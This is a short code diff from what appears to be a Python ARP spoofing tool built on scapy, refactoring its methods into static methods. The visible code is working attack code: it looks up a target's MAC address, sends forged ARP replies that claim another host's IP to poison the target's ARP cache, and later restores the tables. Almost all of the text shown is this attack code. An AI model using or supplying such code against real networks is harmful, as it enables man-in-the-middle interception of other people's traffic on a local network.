@@ -31,6 +31,7 @@ class ARP_Spoof:
 
             return args
 
+    @staticmethod
     def get_mac_addr(ip):
         arp_request = scapy.ARP(pdst=ip) 
         broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -39,13 +40,15 @@ class ARP_Spoof:
         
         return answered[0][1].hwsrc
 
-    def spoof(self, tgt_ip, spoof_ip):
+    @staticmethod
+    def spoof(tgt_ip, spoof_ip):
         tgt_mac_addr = ARP_Spoof.get_mac_addr(tgt_ip)
         # op=2 is a response, not a request
         pkt = scapy.ARP(op=2, pdst=tgt_ip, hwdst=tgt_mac_addr, psrc=spoof_ip)
         scapy.send(pkt, verbose=False)
 
-    def restore_tables(self, dst_ip, src_ip):
+    @staticmethod
+    def restore_tables(dst_ip, src_ip):
         dst_mac_addr = ARP_Spoof.get_mac_addr(dst_ip)
         src_mac_addr = ARP_Spoof.get_mac_addr(src_ip)
         pkt = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac_addr, psrc=src_ip, hwsrc=src_mac_addr)
